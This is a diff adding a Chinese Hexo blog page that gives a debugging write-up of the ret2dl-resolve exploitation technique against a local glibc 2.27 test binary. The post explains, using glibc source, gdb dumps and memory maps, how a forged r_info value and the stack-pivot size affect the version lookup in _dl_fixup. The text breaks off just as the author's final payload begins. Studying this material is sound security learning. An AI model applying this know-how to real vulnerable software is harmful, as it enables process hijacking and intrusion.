@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="憋问，问就是来踩坑的(笑)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2dl">
+<meta property="og:url" content="http://yoursite.com/2020/11/13/ret2dl/index.html">
+<meta property="og:site_name">
+<meta property="og:description" content="憋问，问就是来踩坑的(笑)">
+<meta property="og:image" content="http://yoursite.com/img/ret2dl/error.png">
+<meta property="og:image" content="http://yoursite.com/img/ret2dl/success.png">
+<meta property="article:published_time" content="2020-11-13T03:45:20.000Z">
+<meta property="article:modified_time" content="2020-11-23T11:47:56.962Z">
+<meta property="article:author" content="ph4ntom">
+<meta property="article:tag" content="binary">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/img/ret2dl/error.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/11/13/ret2dl/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>ret2dl | </title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title"></h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/13/ret2dl/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ph4ntom">
+      <meta itemprop="description" content="The wheel turns,nothing is ever new">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ret2dl
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-11-13 11:45:20" itemprop="dateCreated datePublished" datetime="2020-11-13T11:45:20+08:00">2020-11-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-11-23 19:47:56" itemprop="dateModified" datetime="2020-11-23T19:47:56+08:00">2020-11-23</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>憋问，问就是来踩坑的(笑)</p>
+<a id="more"></a>
+
+<h1 id="Ret2dl-What"><a href="#Ret2dl-What" class="headerlink" title="Ret2dl?What?"></a>Ret2dl?What?</h1><p>直接贴链接，不再赘述 <a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a></p>
+<h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><ul>
+<li>Ubuntu 18.04</li>
+<li>glibc 2.27</li>
+</ul>
+<h1 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h1><p>首先，我按照<a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/中的payload进行了调试，自行调整，一直到stage" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/中的payload进行了调试，自行调整，一直到stage</a> 4，大体都是ok的，原理也比较清晰易懂，修改的地方也不是很多</p>
+<p>但是，在stage 4时，却一直无法成功，于是我先仔细研究了payload，发现和作者步骤过程基本一致，与ctf-wiki上也是大差不差，但是却一直报非法内存地址访问。</p>
+<p>嘛，那就gdb大法呗～</p>
+<h2 id="确定报错位置"><a href="#确定报错位置" class="headerlink" title="确定报错位置"></a>确定报错位置</h2><p>首先先确定了报错位置</p>
+<p><img src="/img/ret2dl/error.png" alt="error"></p>
+<p>可以看到，此时的edx所指向的内存地址是无法访问的，故而在<code>0xf7fd6fed &lt;_dl_fixup+125&gt;  mov    ebx, DWORD PTR [edx+0x4]</code> 尝试取值的过程中，程序崩溃退出</p>
+<p>那么为何在payload几乎相同的情况下，却会发生这种问题呢，带着疑惑，继续向下看</p>
+<h2 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h2><p>其实一开始我是以为我哪里写错了，所以浪费了一些时间去校对代码，但是无果</p>
+<p>于是只能用最直接的方法，看看glibc的实现，找到为何会出现这个问题</p>
+<p>报错部分的源代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This function is called through a special trampoline from the PLT the</span></span><br><span class="line"><span class="comment">   first time each PLT entry is called.  We must perform the relocation</span></span><br><span class="line"><span class="comment">   specified in the PLT of the given shared object, and return the resolved</span></span><br><span class="line"><span class="comment">   function address to the trampoline, which will restart the original call</span></span><br><span class="line"><span class="comment">   to that address.  Future calls will bounce directly from the PLT to the</span></span><br><span class="line"><span class="comment">   function.  */</span></span><br><span class="line"></span><br><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br><span class="line">	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"># endif</span><br><span class="line">	   struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab</span></span><br><span class="line"><span class="function">    </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc</span><br><span class="line">    = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;</span><br><span class="line">  <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="keyword">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we're really looking at a PLT relocation.  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don't look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> = <span class="title">NULL</span>;</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">	    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">	  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">	  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">	    version = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>通过比对汇编与源代码，我找到了报错语句为<code>if (version-&gt;hash == 0)</code> ,也就是说在尝试获取version结构体中的hash成员值时出错了</p>
+<p>那这个<code>version</code>又是什么？</p>
+<p>这里要感谢这位师傅的分析，给了我一点启示 <a href="https://forum.90sec.com/t/topic/260" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/260</a> </p>
+<p>总的来说，原理大概可以概括为，在<code>_dl_fixup</code>中，需要校验符号的版本(version)，而这个<code>version</code>值是这样取的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">version = &amp;l-&gt;l_versions[ndx];</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，ndx作为<code>l_versions</code>成员的下标，其取值与<code>sym</code>的取值十分相似</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>symtab</code>就是<code>.dynsym</code>节的起始地址，而其中的<code>reloc-&gt;r_info</code>则是我们所控制的值，此值被同时用于<code>version</code>以及<code>sym</code>的取值</p>
+<p>所以也就是说，在我们满足了劫持<code>sym</code>至我们伪造的<code>sym</code>结构体上的同时，我们也必须兼顾<code>version</code>的取值，如果我们所伪造的<code>reloc-&gt;r_info</code>值不恰当，那么就可能导致<code>version</code>取值出现错误</p>
+<p>而这个<code>reloc-&gt;r_info</code>值实际上与我们在payload中<code>.bss</code>段抬高的栈顶大小有关，故而包括ctf-wiki以及很多网上的payload中所谓的“抬高栈顶至<code>bss+0x800</code>是为了防止<code>_dl_fixup</code>会引用位置较低的地方”这个解释是不完全正确的，实际上抬高栈顶主要还是为了保证<code>reloc-&gt;r_info</code>能在一个合理的区间之内，使得<code>sym</code>以及<code>version</code>都能被正确的取值</p>
+<p>而我们所希望的，就是使得<code>version</code>能够取值到<code>null</code>(具体可以详细看上面师傅的文章),为了达到这一点，我们就需要使得<code>ndx</code>的值尽可能为0(因为<code>l-&gt;l_versions[0]</code>一般为<code>null</code>)</p>
+<h2 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h2><p>那么，我就来详细讲栈顶抬高对于<code>version</code>的影响，以及如何尽可能保证<code>ndx</code>的值能够取到0</p>
+<p>首先，栈顶抬得越高，意味着我们所伪造的<code>sym</code>结构体相对于<code>.rel.plt</code>节的起始位置的偏移距离也会越来越大</p>
+<p>这一偏移距离与我们所伪造的<code>reloc-&gt;r_info</code>值息息相关</p>
+<p>而<code>reloc-&gt;r_info</code>值则关系到了<code>ndx</code>的值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#96;&#96;&#96;c</span><br><span class="line">ElfW(Half) ndx &#x3D; vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</span><br></pre></td></tr></table></figure>
+
+<p>对应的汇编代码如下，其中<code>esi</code>的值<code>0x269</code>是我们伪造的<code>reloc-&gt;r_info</code>的值，<code>edx</code>是<code>.gnu.version</code>的起始地址，并且此时栈顶抬高的距离为<code>0x800</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$edx   : 0x080482d8</span><br><span class="line">$esi   : 0x269</span><br><span class="line">......</span><br><span class="line">0xf7f45fda &lt;_dl_fixup+106&gt;  movzx  edx, WORD PTR [edx+esi*2]</span><br><span class="line">0xf7f45fde &lt;_dl_fixup+110&gt;  and    edx, 0x7fff</span><br></pre></td></tr></table></figure>
+
+<p>当上面的代码执行完成后，<code>edx</code>的值如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$edx   : 0x300e</span><br></pre></td></tr></table></figure>
+
+<p>此时<code>edx</code>的值实际上就是<code>ndx</code>的值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#96;&#96;&#96;assembly</span><br><span class="line">8048714 00000000 20000000 68000000 d6fdffff  .... ...h.......</span><br><span class="line">8048724 46000000 00410e08 8502420d 05448303  F....A....B..D..</span><br><span class="line">8048734 7ec5c30c 04040000 38000000 8c000000  ~.......8.......</span><br><span class="line">8048744 f8fdffff a7000000 00440c01 00471005  .........D...G..</span><br><span class="line">8048754 02750045 0f037574 06100702 757c1003  .u.E..ut....u|..</span><br><span class="line">8048764 02757802 90c10c01 0041c341 c741c543  .ux......A.A.A.C</span><br><span class="line">8048774 0c040400 48000000 c8000000 70feffff  ....H.......p...</span><br><span class="line">8048784 5d000000 00410e08 8502410e 0c870341  ]....A....A....A</span><br><span class="line">8048794 0e108604 410e1483 054e0e20 690e2441  ....A....N. i.$A</span><br><span class="line">80487a4 0e28440e 2c440e30 4d0e2047 0e1441c3  .(D.,D.0M. G..A.</span><br><span class="line">80487b4 0e1041c6 0e0c41c7 0e0841c5 0e040000  ..A...A...A.....</span><br><span class="line">80487c4 10000000 14010000 84feffff 02000000  ................</span><br><span class="line">80487d4 00000000 00000000</span><br></pre></td></tr></table></figure>
+
+<p>此时程序的整体内存空间布局如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start      End        Offset     Perm Path</span><br><span class="line">0x08048000 0x08049000 0x00000000 r-x &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0x08049000 0x0804a000 0x00000000 r-- &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0x0804a000 0x0804b000 0x00001000 rw- &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0xf7d92000 0xf7f67000 0x00000000 r-x &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f67000 0xf7f68000 0x001d5000 --- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f68000 0xf7f6a000 0x001d5000 r-- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f6a000 0xf7f6b000 0x001d7000 rw- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f6b000 0xf7f6e000 0x00000000 rw- </span><br><span class="line">0xf7f87000 0xf7f89000 0x00000000 rw- </span><br><span class="line">0xf7f89000 0xf7f8c000 0x00000000 r-- [vvar]</span><br><span class="line">0xf7f8c000 0xf7f8d000 0x00000000 r-x [vdso]</span><br><span class="line">0xf7f8d000 0xf7fb3000 0x00000000 r-x &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7fb3000 0xf7fb4000 0x00025000 r-- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7fb4000 0xf7fb5000 0x00026000 rw- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xffa55000 0xffa76000 0x00000000 rw- [stack]</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>0x80487aa</code>落在了下面这页上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x08048000 0x08049000 0x00000000 r-x &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br></pre></td></tr></table></figure>
+
+<p>而我们都知道，内存页未被使用的空间均被0填充</p>
+<p>故而我们可以从上面得到一个信息，从<code>0x80487db</code>-<code>0x08049000</code>这一段区间内，都被0所填充</p>
+<p>那么如果我们可以控制<code>edx+esi*2</code>的值落在这一区间，我们就可以保证<code>ndx</code>的值为0，从而使得<code>version</code>为null</p>
+<p>而现在我们的ndx并不是0，所以我们先保留上述观点，继续看下去</p>
+<p>接着执行如下代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">version = &amp;l-&gt;l_versions[ndx];</span><br></pre></td></tr></table></figure>
+
+<p>对应的汇编代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$eax   : 0xf7f5e940  →  0x00000000</span><br><span class="line">$edx   : 0x300e0</span><br><span class="line">......</span><br><span class="line">0xf7f45fe4 &lt;_dl_fixup+116&gt;  shl    edx, 0x4</span><br><span class="line">0xf7f45fe7 &lt;_dl_fixup+119&gt;  add    edx, DWORD PTR [eax+0x170]</span><br><span class="line">0xf7f45fed &lt;_dl_fixup+125&gt;  mov    ebx, DWORD PTR [edx+0x4]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#96;&#96;&#96;assembly</span><br><span class="line">gef➤  x&#x2F;wx $eax+0x170</span><br><span class="line">0xf7fb4ab0:	0xf7f873f0</span><br></pre></td></tr></table></figure>
+
+<p>第二句汇编执行完成后，<code>edx</code>的值如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$edx   : 0xf7fcb6b0</span><br></pre></td></tr></table></figure>
+
+<p>此时内存布局是这样的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start      End        Offset     Perm Path</span><br><span class="line">0x08048000 0x08049000 0x00000000 r-x &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0x08049000 0x0804a000 0x00000000 r-- &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0x0804a000 0x0804b000 0x00001000 rw- &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0xf7d92000 0xf7f67000 0x00000000 r-x &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f67000 0xf7f68000 0x001d5000 --- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f68000 0xf7f6a000 0x001d5000 r-- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f6a000 0xf7f6b000 0x001d7000 rw- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f6b000 0xf7f6e000 0x00000000 rw- </span><br><span class="line">0xf7f87000 0xf7f89000 0x00000000 rw- </span><br><span class="line">0xf7f89000 0xf7f8c000 0x00000000 r-- [vvar]</span><br><span class="line">0xf7f8c000 0xf7f8d000 0x00000000 r-x [vdso]</span><br><span class="line">0xf7f8d000 0xf7fb3000 0x00000000 r-x &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7fb3000 0xf7fb4000 0x00025000 r-- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7fb4000 0xf7fb5000 0x00026000 rw- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xffa55000 0xffa76000 0x00000000 rw- [stack]</span><br></pre></td></tr></table></figure>
+
+<p>可以看到此时<code>edx</code>的值已经处在了无法访问的内存区域，故而当执行到第三句汇编时，程序就会崩溃</p>
+<p>综上所述，我们可以知道，栈顶被抬高的大小应当严格控制，必须使栈顶抬高的大小能够让如下语句中的<code>edx+esi*2</code>落在规定的区间内，否则就会导致错误(当然，如果没有落在规定区间内，也有几率成功，因为基于上面<code>edx+esi*2</code>所指向的部分内存空间,我们可以看到存在一些双字节数据为<code>0x0000</code>,当<code>edx+esi*2</code>指向的数据为这些特殊位置时，也可以成功)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xf7f45fda &lt;_dl_fixup+106&gt;  movzx  edx, WORD PTR [edx+esi*2]</span><br></pre></td></tr></table></figure>
+
+<p>我们也可以通过计算，得出栈顶至少应当被抬高的偏移值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">此时&#96;&#96;&#96;esi&#96;&#96;&#96;应当为&#96;&#96;&#96;0x503&#x2F;0x2&#x3D;0x282&#96;&#96;&#96;(向上取整)</span><br><span class="line"></span><br><span class="line">也就是说，我们伪造的&#96;&#96;&#96;reloc-&gt;r_info&#96;&#96;&#96;最小值应当为&#96;&#96;&#96;0x282</span><br></pre></td></tr></table></figure>
+
+<p>反推最小抬高距离(在我的payload情况下),<code>0x80481cc+0x10*0x282-0x804a000-0x50=0x99c</code></p>
+<p>其中<code>0x804830c</code>为<code>.dynsym</code>节的起始地址，<code>0x804a000</code>为<code>.bss</code>节的起始地址,<code>0x50</code>为已构造的payload的长度</p>
+<p>附上我的最终payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 